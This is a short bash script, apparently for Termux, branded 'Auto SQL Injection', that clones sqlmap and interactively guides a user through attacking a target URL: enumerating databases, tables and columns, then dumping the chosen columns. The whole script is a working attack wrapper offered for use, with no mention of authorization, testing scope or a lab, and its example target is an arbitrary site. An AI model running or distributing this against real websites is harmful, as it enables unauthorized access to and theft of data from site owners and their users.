echo -e '\e[1;31m[+] Please Wait..... [+]\e[0m'
pkg install figlet >/dev/null 2>&1
if [[ -d "sqlmap" ]]
then
   echo -e "\e[1;32mSqlmap folder is exists on your system\e[0m"
fi
git clone https://github.com/sqlmapproject/sqlmap >/dev/null 2>&1
 clear
echo -e '\e[1;32m'
figlet -f slant "Auto SQL Injection"
echo -e '\e[0m'
echo -e '\e[1;31m [+]---------------------------------------------------[+]
                    Author:Bhone Myat Han
                    Github:
                    
                 Specially Thank to Sqlmap Tool
 [+]---------------------------------------------------[+]
\e[0m'
echo -e "\e[1;31m              Eg:targetsite.com/index.php?id=1 \e[0m"
echo ""
read -p $'\e[1;32mEnter Url::\e[0m' url
cd sqlmap
python2 sqlmap.py -u $url --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u $url -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u $url -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u $url -D $db -T $tbl -C $col --dump
